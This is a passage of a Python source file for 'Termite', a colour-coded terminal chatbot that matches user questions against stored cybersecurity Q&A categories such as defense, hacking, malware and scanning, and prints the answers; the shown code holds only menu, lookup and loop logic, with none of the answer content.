            "hacking": (self.hacking_techniques, "Hacking Techniques", Colors.MAGENTA),
            "malware": (self.Malware_scripts, "Malware Scripts", Colors.MAGENTA),
            "scanning": (self.scanning_tools, "Scanning Tools", Colors.BLUE),
            "vulnerabilities": (self.vulnerability_detection, "Vulnerability Detection", Colors.CYAN)
        }

        category = category.lower()
        if category in categories:
            questions_dict, title, color = categories[category]
            print(f"\n{color}{Colors.BOLD}{title}:{Colors.END}")
            print(f"{Colors.CYAN}{'='*50}{Colors.END}")

            for i, question in enumerate(questions_dict.keys(), 1):
                print(f"{Colors.YELLOW}{i:2d}.{Colors.END} {Colors.WHITE}{question.title()}{Colors.END}")

            print(f"{Colors.CYAN}{'='*50}{Colors.END}")

    def show_all_questions(self):
        """Display all available questions from all categories"""
        print(f"\n{Colors.GREEN}{Colors.BOLD}ALL AVAILABLE QUESTIONS:{Colors.END}")
        print(f"{Colors.CYAN}{'='*60}{Colors.END}")

        sections = [
            ('BASIC SECURITY', self.questions_answers, Colors.BLUE),
            ('DEFENSE TECHNIQUES', self.defense_techniques, Colors.MAGENTA),
            ('HACKING TECHNIQUES', self.hacking_techniques, Colors.MAGENTA),
            ('MALWARE SCRIPTS', self.Malware_scripts, Colors.MAGENTA),
            ('SCANNING TOOLS', self.scanning_tools, Colors.BLUE),
            ('VULNERABILITY DETECTION', self.vulnerability_detection, Colors.CYAN)
        ]

        for title, data_dict, color in sections:
            print(f"\n{color}{Colors.BOLD}{title}:{Colors.END}")
            for i, question in enumerate(data_dict.keys(), 1):
                print(f"{Colors.YELLOW}{i:2d}.{Colors.END} {Colors.WHITE}{question.title()}{Colors.END}")

        print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")

    def find_answer(self, user_input: str) -> str:
        """Find matching answer from all categories"""
        user_input = user_input.lower().strip()
        all_questions = {
            **self.questions_answers,
            **self.defense_techniques,
            **self.hacking_techniques,
            **self.Malware_scripts,
            **self.scanning_tools,
            **self.vulnerability_detection
        }

        if user_input in all_questions:
            return all_questions[user_input]

        for question, answer in all_questions.items():
            if self.similarity_check(user_input, question):
                return answer

        return f"{Colors.RED}Ooh sorry I cannot find that question, ask again please!!{Colors.END}\n{Colors.YELLOW}Type 'categories' to see available question types.{Colors.END}"

    def similarity_check(self, user_input: str, question: str, threshold: float = 0.6) -> bool:
        """Check similarity between user input and stored questions"""
        user_words = set(user_input.split())
        question_words = set(question.split())

        if not user_words or not question_words:
            return False

        intersection = user_words.intersection(question_words)
        union = user_words.union(question_words)
        similarity = len(intersection) / len(union)
        return similarity >= threshold

    def clear_screen(self):
        """Clear terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def run(self):
        """Main enhanced bot loop"""
        self.show_banner()
        self.show_help()

        while True:
            try:
                user_input = input(f"\n{Colors.CYAN}Termite{Colors.END} {Colors.WHITE}>{Colors.END} ").strip()
                if not user_input:
                    continue

                cmd = user_input.lower()

                if cmd in ['exit', 'quit', 'bye']:
                    print(f"{Colors.GREEN}Thank you for using Enhanced Termite! Stay secure!{Colors.END}")
                    break
                elif cmd == 'help':
                    self.show_help()
                elif cmd in ['categories', 'category']:
                    self.show_categories()
                elif cmd in ['basic questions', 'basic security']:
                    self.show_category_questions('basic')
                elif cmd in ['defense techniques', 'defense']:
                    self.show_category_questions('defense')
                elif cmd in ['hacking techniques', 'hacking']:
                    self.show_category_questions('hacking')
                elif cmd in ['malware scripts', 'malware']:
                    self.show_category_questions('malware')
                elif cmd in ['scanning tools', 'scanning', 'tools']:
                    self.show_category_questions('scanning')
                elif cmd in ['vulnerabilities', 'vulnerability detection']:
                    self.show_category_questions('vulnerabilities')
                elif cmd in ['all questions', 'show all']:
                    self.show_all_questions()
                elif cmd in ['clear', 'cls']:
                    self.clear_screen()
                    self.show_banner()
                else:
                    answer = self.find_answer(user_input)
                    print(f"\n{answer}\n")
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Exiting Enhanced Termite... Stay secure!{Colors.END}")
                break
            except Exception as e:
                print(f"{Colors.RED}An error occurred: {str(e)}{Colors.END}")

def main():
    """Entry point"""
    bot = TermiteBot()
    bot.run()

if __name__ == "__main__":
    main()
